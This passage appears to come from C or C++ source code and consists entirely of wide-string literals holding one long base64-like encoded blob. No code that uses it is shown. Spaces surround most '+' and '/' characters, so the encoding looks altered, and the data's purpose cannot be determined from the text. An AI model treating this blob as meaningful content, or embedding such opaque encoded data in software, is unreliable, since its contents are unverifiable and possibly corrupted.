l7nhxM + dWBjr1Zn9JFBao30oCe / XVt5ojhm10o2jjjdfgWD427IfIflR4 + rvYxlGFpRYdmFkOedC5F6oNZAU8fai2FfZp1l6uFhSZxvQswmzOTXahuMGL8HjtIX14uq + 8TKdZLrjTIaqwnJG + gNawle1MP6d9ookxVMur1WBj0pWY2Yuf1Djpxu4BwkBf84j / U9NWxeLL1Ifg / BawEAKYX5s3p7ErTacQBJyecAVgQqYEvEZyDrivwedO1HJQJZVH2WZsDTqwFlkCffRzmhvlRafMDFly6Os4Grp4ZolUPSDauLAy / XoqeXhuwYBXvHCnCGBmbpcmRMQh / JZ / 8A2pm + xAIUK4K1U3W + f6cb3yDmECcey8F2vd3bJtTTDebdKObdENs / XUTTyGk3jSIjde3qLmyKBSStr6TVrXEZEdQm1xQcwQe8tJE9U9ISbZLDXnW / 8G4ohBjcKcrC08SbV3OiMbJaguwkgJ4H4NDxldnoMgythY4dR6WBeRsCmvgTegFDFVQheDVFrC9gk7N9jWmWlGjuboAT8xuAuFN30gOblvak + eDIW6MibtOLQE9hmIAf4ush14FuHmJORtlHR8ui4tCXcDW5hOM + ee6XyRjHldJiegWYXv9uWKUt3LM3Vh7yf / 0l8I9w92kub47g8BxJl5Pf6Q342zlCsviFQnOE7IAt4HBfKJnBIsHWrdB6bVorwaSqQ5gc2acy + lQDJcrTuEufMlhQL8UgfGWHl10i / bAPbB8avhA2pD / piUsDFr6sotXsbVejvsiE7scxNBGr0kDqZBRRX3YDz2OtDGti / Q9ptIri9X08gd606jWBsU1AtI / FRfj7EEuLfftIZPZJSXnwYsazyCVugCDz5 / PB / R + 6KsYdgYkEww9HTneaEy5WbMthegU0DK2hielQh5F / S6fc2ONgshZGIRMNeO1k7oBkfSboNERC5Z4BS7YjlsSXqWrU7Ykfs31bTfNSikWclnWG4cOHOJqGGgyZshtUVI7JpDGpacHZEDQN9idvOq7ON + tFEnI8EnEqCdPUtlgCGlAlh7eyWcS6RkXtBds2h5GRre3N3CtVOLv95v6XRSkU9FTBanz1Xj4jNf7kuT + a9xwoYdc + Zz9bhgi3R + 0HLp5B1yxH0sPNbKkiuZhhhZ4u + 1rfdJu + TnPhPKWpabWTzoxpDmmFRfCR9yk0OuhlH + fiAz6liaz8qiEkOburYFAl53LHgPcjCcwvMP + ryQSHHSpIUfngalYNCTaMvO5jm / 4aKUXoh105MPafjN3Jx58lQ5mQioe8FjD6RqRT / CBpuch25Z5oc8IP / FLBQ237 + jwvTe7 + qZUsR8INA / sgcJzrk53LDVy / zecgc3vSq8TTC6wqvxfBmflGKTbAVyHrnrY7AojqF5AB6Uw4NHZqrfIJv5i0WsMLcgnEk8k / IxGdd30wxRGRgoljeXpVEpRWQ69GKdUTyNsKKcm7Q7lAAy12 + 1Ot3beHKuYOyppUUzeWTkyXF2 + lfiOudlK71e / 3dk5Dz8zg7MBr0WANRAdZcfQgTTN1pEgwfZUC9 / hvlpZuFa3LMtAzUVgb04VAPZKnjk4BbXg58rhSlk8ZpVX3cMUJ9o8aMYJPQ0nHC4w6Ch4bs + aWeZcEhecLX8lX2KuGQ57CREZ9uSJXg1xMdS3 + SCrphdKFtrfD3IpY8BY0YWefy + a5NiYg / 57tYPUCSSJb53sCgyB2mvMnM2qJb4wW / wP2OqlIDEK2lX0rbcg91 / 5229fNrJoB3oM77ekUllW / tZmWMY6msooU7USTYdRxa / dR4PljszRMpOq4MXYnNWPO8F8L / Gq2nlEu28h0iEIGP5qgJ15Ib7c72 / +a9KHjYJChVAv365dqaRIxV7D9D8UzcYcb30YlroWaSfkh7WrzbTLJuo89709bFi4WMP / oaHdtRJURVZemS7jqHtxBoL9ImbsxAj18B / zltciPqr8Q1ekc3qxMVbNU + HiQS1c8mMbXHcmU8unJyg7ooc3 / rCRJ7B6gbnYNH8 + QxKcpcOua / XvPRTP2jHAGL9PayXnC063pA / 26xTzXDuh0tWbQT0Nm58yZZI4DPAAVZ54wMfnogGlzJtvInDz1ZChnsL677QWcFm5 / LEvUle5 / 1ymr7TBOeZpS3ZwYM86oprRr6 + FRmNOXrdRmwD4vYVNKjWGX4V"
						 L"zXZJO69MrFRFA0wLo3NLm / l0dLDE3yWC2qL4D0hBVohrln + HeHc8GBhDxoAokPOraD / pNEaHfZWYr + tuhGdB7GIhw7V4qI / idsed1DlIWC2GF0q + 7HvIIXrfAmejU2c0ZGvT33Jeo8SOt1sM7SnEJm3YE5N7eeM1vT53qT771Z6tZERKWA17UoTKktVdsUvWubUw1h6wP4MRvPrvAN1j8UQv5SLrGPrhw / Z00 / liwaDCfinoGa2DOikqcp322jkxG5 + MEFi / GUq3hJM5O6m0a38VSYn5NSM1czr6Ybfa / UzfZnFDYxpufJJw / i6Mvdgpnq + xpW / nyZb9AgJivQSY9v8o0AkThKE6IVi1lUsZrxXITQ80ZR + a7VPskIEwewP + ZSAGnAw2yf9ttUO7bWnIBwfqLgntEri7ngj5DomJWjxJGU55XZqYHOYo0WVe19zkmdIfpP96DGb + / BOtrEFYnwwhT0JT63wK3u5uuiVYbPe5A8aCRHvq + bRAEmAH5RsShJLEMp8y / ClyrTDRmZ45OBB9poK381jwsOWzZprZCGq / rJvzfgCJeEGPrxLQl8dBDSxGlDXqsntKr7vzNqjN9FhUODgRs2f5ITZMy1 / wCvcycujOoGJopeMywMoR3dJ9 / 7NlaBvhYvALMOE41woZEYGsG + 12WkcPQlYclLtF9tjw04zIYn04LsLokiYEnz8cXjDjmGNegcQtad0UZivgwCYpaG1Mb5fon6Nc2YRLM1BcwU3iwSg0XMLEqejeW5eRoZk + J6ZXCJ4UZJBqW / oke4UUu8DEGLlc2 + 8lXB4Wh6NLgRkZnvES6jvXybdiGpVwLVtUs1kPtcI2qgOl / OP6xpugQHyWjNPHPKYXUgOR6PSn20sd3E8TNw7zFAHXekH0Z8pWMG44M0W56PSP + 3Ymt + 1OrFF0zOK1 + 4jzF6jgf8tsmaK3YK1tugw / mOerXVN + xYJV1gJWZPVo5QVxdr + 7kZ38XKMul + b6Z26sZqqYL6QGNHeQHNFwk0zq4lxF0wWceYhHxI88M9cq9Qbenio3DknZMQYD + Mjo + aoepv5PpLs2Y1J + M1Adc6EzTGBPkB0pCsFmvISZdVFFvj + 0IQTPb9SeEU / cN + UsxjFngtJKl6Y7ot7AjpGQycRNjgk5ZD7FQTMC6WfO7cnPNvnSvSkAuSu++MMhHeOeyQYqrdnXZiHULbzxfvKnE + 7pv + q1G7zBjQg32ok3aKQ1plSbzbJ2VvcdEfzpOBWinkVn6kfTLDkjD + 6Y + 4q4oQ / VSxZknm3Dhk8BkmugwRhHCxeE + usN2bcN1Sd / iumveBGjRtMG4thvbjd / TSvak2OtewfqsRTsmafaYboGtr1ofNbCIj3yfSKjRfRmMvR / lTEdZwiOCplTGDuYGgi9Lsm6VRpFKhFV6wph7GZra / zY + oenqeGnEWfUSB17BGxf3afF04rOTiGPzWMZoSxpGn6HiW2M0t3HGrzhRrLrSFC50EwABqsnQGCfim5U5ltxUvooHVQi4YtZD9wRrQ7EH5ug5rzRNRE / bPtxwmkcs2dV8q5uUhQERPbzNwQx5U4pX5r92WN932BvPJSJoUYsPDbGoFJCqYh2bV / yd3aesrcKiQSzyLcUXeeSgVsoglIaRTncuCdv13O7v55A7JPuForTHTRing03OnMQ1aRabSlMz9ePhkUZeedidv10UoMnmff3WozP3NMEr28h7 + j19iJ2ZHmZR4udhayTvcxZmBBDAI0Ue0nUJYadqriIimi37uFBlmNZuuiUDfup3NV0jQ + Bmb0DhbELU1a4WQvZnmbcnZe / 2b / HBtVGE8SDlNVuZt4MQ5l4KO45xO + dEJwURIY / 5c7MtR//UkFd1BOHvtU0NxQUJggAma0xcxUL9q+Jqh/y+6or5TiIt+I6hE3uIJ7zW5/xsD0273fWW4E+zKKWB1KRmoXMvDcmn5TIV2e+TS1k9THZDT+6v8YgUyv//ljRZUuW3MYvo5u6r56oilroRFxVJaZkkzcifmE3lXUtvPx3B47f7tmQ1Y9N96mg2yeMnSUYxIg491wbDc5ICnfWUKaZW0Zu/nL1Awk9cR73sQVw96dIegh5atyEk2GX7Hv10w49bnKvnF/2e8N8D1xptjRdIi3fAyvCEVeOu8S1sSihStgUJMB1JUlJmeRcWuD3GlAlMo9Swm5Jps0v1TxCrrtJpqF6Vr/8uilhkJsTKjzNjQRSs38XkOkLq/5oQiIxVoi0MyX/MRTal5z4aeA6Kty0Mtezvx6R9H+PWHH9Fqcr2V0+bLLpI9sGrS9ebzHUNboWDW4NcZxCzgT/gr4P/aRbI6ZuKPCOUqOEZmGu2Q+Qi92e6npcA2jDWe8yuyJ79bHOhcRGBPMJwlqQ/GsVv73REIpOy6xZOhQ6PElJkSLU5aRVs4dHjlfPF2eJsTbHp5WuiKVRhnpnfucgsgiReSlnmHkuPMKnhkRq5UPOAEzNfzL2nfPGojKvSiBaVlnI/2d55STMdWAzUZokr3rTfAA1tpNGeKt7P0UVdMNyawbsoi2FpiaW0prUQXdGf4UDqT385y8CwwRDMA5U8jcJTUpJCHC5qiPKFGsLaxAkJbB510t6t+Qw0rI48IW4pmNbPnXcNhImck3z7bAfXz0Cv4GAhuLDNcSsRB7rpDfa+BoFqg26906xEcCJkbyhMNYRBl+ikAmWT/ziLRX/wdRUxyXgVINcbL4TBKizjTYEJj/RkusyBB7SoZSAJvwqeK7JbdEM+XHVB+FZShHCzr4w/1cl5SIzldpWiSh+sUdMoPfv6MH+OA2HsoxzCihx8otIy0zEWe4S/ZGU0mvn9cSQ0ByIZSl6jUQ57vFAaVMY90tpREUd7QKJ026ZWZah3WUC97aAuxPeJ5dEiAF7pxZYcR7Tsnd8fjef5J+3ypfkqmBDyii6rYYJwn1S2JOExK6VOlKh+q+VqjKzkLnWjEUDGNr1ufNR4XBnfrR2pAONsqhc+BXaik9ScMStxVcBQMfSplHzPlrT5rmlYoUilhQljp4VQZYmwiW5MQbQOXnZ7cXtOfSCvDDUVj43nQBlZG8JUixMykLir43a/SGzzj2lJcbCqtRT35dMbVIj0kue1+N24s0UsXskQCBlwRmui9wEE8DE+Pc2vGDQ49VXR72SY1v020oZBdS+0Kg3sqjbyqYGjROho/vCSrIA5jdi2i4fsQX38fi3Nxeggtw0gV9pktAhkmp7ommz79S7P70gYCf0Jo4drnM3O5xsrxjQQ4i0YVS+R86g8FyHZ6+nTFwhFvlAY39r7nwXC7YP/EK8aDhsbp7z3bbJaBmbQrkeox2ojImGPb3v2cddh/jPD885Uld8uBUB7p438Ktu7kF2hjWG/peVv4r5JncQxt13ifTpyONTLmRXHCYgTcHzl/LSJvWP8Y0mZR9Q4PPQAk5Cwf5Tw+10+f1ZsiAYhgWKIBT6xLySaHHr/JbICZLZiYdQe+q9SkXb7ZSx84fM60LeG5M8lLgsFsXJ8TcTAihTgJekA69EY9xi5Dq6ORbhr6SUuEPlV+lUFJ+5dxgvgYWps+BezJyYsM9g5UqJhIfCfJbgHBui18ywpVZZaYCiQEAUvXMHFuv/nsVBQshZUFcflbrSLZbgzLpW1vDc+fSw085+ovYMIdJZdDztNycyupAGRggw/I8gRqYlHJFUBcyCC23OaSvtFCTdrg5SQMnlpoRbZhfBQ"
						 L"LQxcJHOtCedmgYqk0o + cLFr7jFr34VKmCcHIasDXLKBbG65X + pVaZhK9dO7u0x0C2wcokWbnYAiSnSxkxqstrxXUv2IRjj6JOo2M + BnQ3Xpo7QAMLO7aTv7NAX8W847G5iaDXEuF2LXCtfOdJh6w1dJlFVFccCg8yZCw7uwEntLKzLfxBTC8e45g13xIt7Lhqjt5Aa8 / I + ozDNpvq3FU / CD5WAO2HuBg0iIs2IaXEQkbx9iHAT + PUyXns7Al3bUggI4nenm / ET59Slt / rJzuG4DdWpkXByu95u72D6LS9e0AeDkuUBvBcdtg5PBgxjUUhIPb95afIOYlI8jTFHlupRI / sZ94Ro5DcSYAzkUFkI1vNKMcFLtxRjIs1W2IXiHWxXbali6RQDk68wDZpqe / BwI1sXvCIERJdW5RJ0 / 2NLz9AUVIKpx1sqHK8Zuo / QxGY5ct3CYDIYTaTaL + OijB4uoCmjL3Y7Qu1xoAUPhsjDmMr51jquryEGIV57wy + S0Hk2a3AQwGAUb9oBp57zojvCMvedBi4LVMDPJUd / 4uMMzOc38mKG7a3NC / XTKbn8aPpan7iZXl71bhyuPcRefZZAZbkOdCJrCzbrHgXQL1EPJfYtQPmu84z93VCTsKAVUXF4LS / ud3g1i1CziUEBfbR7WgzMoLHiMBGA4VKBsaloikD / +QOt + vDB6 + VMVdR / LrIcYU3840JSScI + eUbQxUCQxcb0DohE5MVCu5 + VrdHT + uC8Df + zXWvKwmvzsS10CCYRUlbWgkgj7PcG3JGtZdBBSgSVnHsgyo / eRkjHjjbj0aFTVb3Qyaq2IcXJ5qdhTd6eK / 2lAiJoetTyrx9On2dcRgka2Fk / by9dW00f9Q2YcLOX1RRfE / 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"
						 L"ywPPRC / CCmv + Maf8N8YP0fP0twW0a1WA2RGMva9ytP1eAsoRTJb6Kjy38aRqSDAU85mvCixQD4QWx + FUckfi23pyLYEW8VaWl3LhozuK5lYgtXvUOWM4IyJ0dCkdhQLQ12g / RaWIxKmxq2JUgZP7w6vRiwrj675zE / gnQMVXHb8QbNX0ntCoLfnByRHEUPd6iT + AGnuLN / kacTSkUQgfXxV + ea3HxcUO / 7XBHPAx4lk / tBz3nGWvOsLtfFo8ALWlGjOFeWEgYU4WK5ibvFL1GYtdhzdK2KoQ8tL + Ru9Bvnk + VFwpVlSFeUanBpQJfh5efwzUZiAr3sIlbIiNzGB5b6iLekS5x7njcHHoYW7QxXDpUaE4e4fENSHqbYDb1dOWmR4byZaXMjtgppOKEkhCwOq9yWOBnJ4VNQbrvuNx + 5JoMTHz6DGYEDRf9Chqk4Qr8zNC + GuCBol0vaBojZHnkm8BTCfhKFh6QPZd8yXgR + 44ZletXipyE33RnZoLhgYHj6tC7aOEzyHHiDJU0qBLZUGaZCnmZvbMD4KJdewI8fvMbN0hpmYxcPlg5t9OVfzXrjRsRFYzk7Rc28Smq7W4s4yhYRJMpxEGhE53mGkHPCpUrttJzF4IvWhC3cYd / Sc + eQSyQ == ";